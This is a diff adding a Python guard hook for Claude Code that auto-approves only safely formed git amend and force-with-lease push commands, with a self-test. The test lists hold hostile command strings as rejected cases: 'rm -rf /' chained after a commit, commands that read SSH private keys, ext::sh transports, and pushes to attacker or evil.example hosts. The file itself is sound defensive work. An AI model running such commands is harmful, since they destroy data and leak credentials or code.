@@ -1,0 +1,242 @@
+#!/usr/bin/env python3
+# Claude Code の PreToolUse hook。git commit --amend と git push --force-with-lease を、
+# 引数を1つずつ確かめて安全な形のときだけ確認なしで通す。それ以外は何も出さず、ふだんの判断に任せる。
+# settings.json の allow は文字列の前方一致なので、git が受け付ける省略形（--rec で --receive-pack など）を塞げない。
+# 使い方: settings.json の hooks.PreToolUse（matcher: Bash）に登録する。`git-rewrite-guard test` で自己テスト
+import json
+import os
+import re
+import shlex
+import stat
+import subprocess
+import sys
+import tempfile
+
+# credential.helper の ! は任意のコマンドを動かせるので、決まった値だけ通す
+SAFE_CONFIGS = {"credential.helper=", "credential.helper=!mise exec -- gh auth git-credential"}
+# URL で push するのは origin と同じリポジトリだけ。別のリポジトリへ送るとコードを持ち出せる
+GITHUB_REPO = re.compile(r"github\.com[:/]([\w.-]+/[\w.-]+?)(\.git)?$")
+# : と + を含む refspec はブランチを消したり上書きしたりできるので通さない
+BRANCH = re.compile(r"^[\w][\w./-]*$")
+LEASE = re.compile(r"^--force-with-lease(=[\w./-]+:[0-9a-f]{7,40})?$")
+# -F で任意のファイルを読ませると、読めないはずの中身をメッセージに入れて持ち出せる。symlink で外を指せないよう、実体のパスで見る
+MSG_DIR = os.path.join(os.path.realpath("/tmp"), f"claude-{os.getuid()}")
+
+
+def msg_dir_trusted():
+    # 土台の dir 自体が他人の作った symlink や、他人が書ける dir だと、中のパスを信じられない
+    try:
+        st = os.lstat(MSG_DIR)
+    except OSError:
+        return False
+    return stat.S_ISDIR(st.st_mode) and st.st_uid == os.getuid() and not st.st_mode & 0o077
+
+
+def msg_file(path):
+    # 相対パスは git -C の先で読まれ、ここで見たものとずれるので、絶対パスだけにする
+    if not (os.path.isabs(path) and msg_dir_trusted() and os.path.realpath(path).startswith(MSG_DIR + os.sep)):
+        return False
+    # ハードリンクは realpath では見分けられない。自分だけが持つ普通のファイルに限る
+    try:
+        st = os.lstat(path)
+    except OSError:
+        return False
+    return stat.S_ISREG(st.st_mode) and st.st_nlink == 1 and st.st_uid == os.getuid()
+
+
+def safe_amend(args):
+    if "--amend" not in args:
+        return False
+    i = 0
+    while i < len(args):
+        if args[i] in ("--amend", "--no-edit", "-q"):
+            i += 1
+        elif args[i] == "-m" and i + 1 < len(args):
+            i += 2
+        elif args[i] == "-F" and i + 1 < len(args) and msg_file(args[i + 1]):
+            i += 2
+        else:
+            return False
+    return True
+
+
+# リポジトリの中の設定と hook は、悪意のあるリポジトリだとコマンドを動かせる（fsmonitor・hooksPath・sshCommand・pushurl など）。
+# リポジトリごとの設定は、下の安全なキーだけのときに通す。ほかのキーが1つでもあれば確認に回す
+SAFE_LOCAL_KEYS = re.compile(
+    r"core\.(repositoryformatversion|filemode|bare|logallrefupdates|ignorecase|precomposeunicode|commentchar)"
+    r"|extensions\.worktreeconfig|lfs\.repositoryformatversion|log\.excludedecoration|user\.(name|email)"
+    r"|remote\.[^=\n]+\.fetch|branch\.[^=\n]+\.(merge|vscode-merge-base|github-pr-owner-number)"
+    r"|gitbutler\..*",
+    re.IGNORECASE,
+)
+SAFE_REMOTE_URL = re.compile(r"(https://github\.com/|git@github\.com:)[\w.-]+/[\w.-]+")
+
+
+def repo_config_safe(cwd):
+    def git(*args):
+        return subprocess.run(["git", "-C", cwd, *args], capture_output=True, text=True)
+
+    listing = git("config", "--show-scope", "--list", "-z")
+    if listing.returncode != 0:
+        return False
+    parts = listing.stdout.split("\0")
+    for scope, entry in zip(parts[0::2], parts[1::2]):
+        if scope not in ("local", "worktree", "command"):
+            continue
+        key, _, value = entry.partition("\n")
+        if re.fullmatch(r"remote\.[^=\n]+\.url", key, re.IGNORECASE):
+            if not SAFE_REMOTE_URL.fullmatch(value):
+                return False
+        elif re.fullmatch(r"branch\.[^=\n]+\.remote", key, re.IGNORECASE):
+            # branch.*.remote には URL も書ける。引数なしの push の送り先になるので、origin だけにする
+            if value not in ("origin", "."):
+                return False
+        elif scope == "command" or not SAFE_LOCAL_KEYS.fullmatch(key):
+            return False
+    hooks = git("rev-parse", "--git-path", "hooks").stdout.strip()
+    hooks = hooks if os.path.isabs(hooks) else os.path.join(cwd, hooks)
+    return not any(not f.endswith(".sample") for f in (os.listdir(hooks) if os.path.isdir(hooks) else []))
+
+
+def origin_repo(cwd):
+    url = subprocess.run(["git", "-C", cwd, "remote", "get-url", "origin"], capture_output=True, text=True).stdout.strip()
+    m = GITHUB_REPO.search(url)
+    return m and m.group(1)
+
+
+def safe_remote(remote, cwd, origin_of):
+    if remote == "origin":
+        return True
+    # 文字列の途中ではなく URL 全体で合わせる。?x=github.com/... のように、末尾だけ合う URL を通さない
+    m = re.fullmatch(r"https://github\.com/([\w.-]+/[\w.-]+?)(\.git)?", remote)
+    return bool(m and m.group(1).lower() == (origin_of(cwd) or "").lower())
+
+
+def safe_push(args, cwd, origin_of):
+    leases = [a for a in args if LEASE.match(a)]
+    rest = [a for a in args if a not in leases and a != "-q"]
+    if len(leases) != 1 or len(rest) > 2:
+        return False
+    if rest and not safe_remote(rest[0], cwd, origin_of):
+        return False
+    return all(BRANCH.match(b) for b in rest[1:])
+
+
+def allowed(command, cwd=".", origin_of=origin_repo, repo_safe=repo_config_safe):
+    try:
+        argv = shlex.split(command)
+    except ValueError:
+        return False
+    # 引用符の付け方まで shlex.join と同じときだけ通す。シェルの展開（{a,b}・*・~・$ など）や && で、
+    # ここで見た引数と実際に渡る引数がずれないようにする
+    if shlex.join(argv) != command:
+        return False
+    if argv[:1] != ["git"]:
+        return False
+    args = argv[1:]
+    while len(args) >= 2 and args[0] in ("-c", "-C"):
+        if args[0] == "-c" and args[1] not in SAFE_CONFIGS:
+            return False
+        if args[0] == "-C":
+            if args[1].startswith("-"):
+                return False
+            cwd = os.path.join(cwd, args[1])
+        args = args[2:]
+    if args[:1] == ["commit"]:
+        return safe_amend(args[1:]) and repo_safe(cwd)
+    if args[:1] == ["push"]:
+        return safe_push(args[1:], cwd, origin_of) and repo_safe(cwd)
+    return False
+
+
+def test():
+    ok = [
+        "git commit --amend --no-edit",
+        "git commit --amend -m 'fix: typo'",
+        "git commit --amend -m 'a && b $(x) {c,d}'",
+        "git push --force-with-lease",
+        "git push --force-with-lease=main:705dc62 origin main",
+        "git -C /Users/me/repo -c credential.helper= -c 'credential.helper=!mise exec -- gh auth git-credential' "
+        "push --force-with-lease=main:705dc627a131503de05fffb24a32bdf0662ce456 https://github.com/me/skills.git main",
+    ]
+    ng = [
+        "git commit -m x",
+        "git commit --amend --no-verify",
+        "git commit --amend -n",
+        "git commit --amend -F ~/.ssh/id_ed25519",
+        "git commit --amend -F /private/tmp/claude-501/../../Users/me/.env",
+        "git commit --amend && rm -rf /",
+        "git commit --amend -m {x,-n}",
+        "git commit --amend -m x*",
+        "git -C ~ commit --amend --no-edit",
+        "git -C /Users/me commit --amend -F ../../private/tmp/claude-501/msg.md",
+        "git commit --amend -m \"$(cat ~/.ssh/id_ed25519)\"",
+        "git push --force-with-lease --rec=touch origin main",
+        "git push --force-with-lease --mir origin",
+        "git push --force-with-lease -d origin main",
+        "git push --force-with-lease origin :main",
+        "git push --force-with-lease origin +main",
+        "git push --force origin main",
+        "git push --force-with-lease ext::sh main",
+        "git -c core.sshCommand=touch push --force-with-lease origin main",
+        "git -c 'credential.helper=!touch /tmp/x' push --force-with-lease origin main",
+    ]
+    if msg_dir_trusted():
+        with tempfile.TemporaryDirectory(dir=MSG_DIR) as d:
+            msg = os.path.join(d, "msg.md")
+            open(msg, "w").write("x")
+            assert msg_file(msg), "scratchpad の普通のファイルは通す"
+            os.symlink(os.path.expanduser("~"), os.path.join(d, "link"))
+            assert not msg_file(os.path.join(d, "link", ".zshrc")), "symlink で外を指すものは通さない"
+            os.link(msg, os.path.join(d, "hard"))
+            assert not msg_file(msg), "ハードリンクのあるファイルは通さない"
+        with tempfile.TemporaryDirectory() as d:
+            outside = os.path.join(d, "msg.md")
+            open(outside, "w").write("x")
+            assert not msg_file(outside), "scratchpad の外は通さない"
+    ng.append("git push --force-with-lease https://github.com/attacker/skills.git main")
+    ng.append("git push --force-with-lease https://github.com/attacker/x?github.com/me/skills main")
+    ng.append("git push --force-with-lease https://user@github.com/me/skills main")
+    origin_of = lambda cwd: "me/skills"
+    for c in ok:
+        assert allowed(c, origin_of=origin_of, repo_safe=lambda cwd: True), c
+    for c in ng:
+        assert not allowed(c, origin_of=origin_of, repo_safe=lambda cwd: True), c
+    with tempfile.TemporaryDirectory() as repo:
+        def git(*args):
+            subprocess.run(["git", "-C", repo, *args], check=True, capture_output=True)
+
+        git("init", "-q")
+        git("remote", "add", "origin", "git@github.com:me/skills.git")
+        assert repo_config_safe(repo)
+        git("config", "branch.main.remote", "origin")
+        assert repo_config_safe(repo)
+        git("config", "branch.main.remote", "https://evil.example/x.git")
+        assert not repo_config_safe(repo), "branch.*.remote に URL"
+        git("config", "--unset", "branch.main.remote")
+        for key, value in [("core.fsmonitor", "touch x"), ("core.sshCommand", "touch x"), ("remote.origin.pushurl", "x"),
+                           ("core.hooksPath", "/x"), ("alias.ci", "!touch x"), ("remote.origin.receivepack", "x")]:
+            git("config", key, value)
+            assert not repo_config_safe(repo), key
+            git("config", "--unset", key)
+        assert repo_config_safe(repo)
+        git("remote", "set-url", "origin", "https://evil.example/me/skills.git")
+        assert not repo_config_safe(repo)
+        git("remote", "set-url", "origin", "git@github.com:me/skills.git")
+        hook = os.path.join(repo, ".git", "hooks", "pre-commit")
+        open(hook, "w").write("#!/bin/sh\ntouch x\n")
+        assert not repo_config_safe(repo)
+    print("ok")
+
+
+if __name__ == "__main__":
+    if sys.argv[1:] == ["test"]:
+        test()
+        sys.exit()
+    payload = json.load(sys.stdin)
+    if allowed(payload.get("tool_input", {}).get("command", ""), payload.get("cwd", ".")):
+        print(json.dumps({"hookSpecificOutput": {
+            "hookEventName": "PreToolUse",
+            "permissionDecision": "allow",
+            "permissionDecisionReason": "git-rewrite-guard: 安全な形の amend / force push",
+        }}))
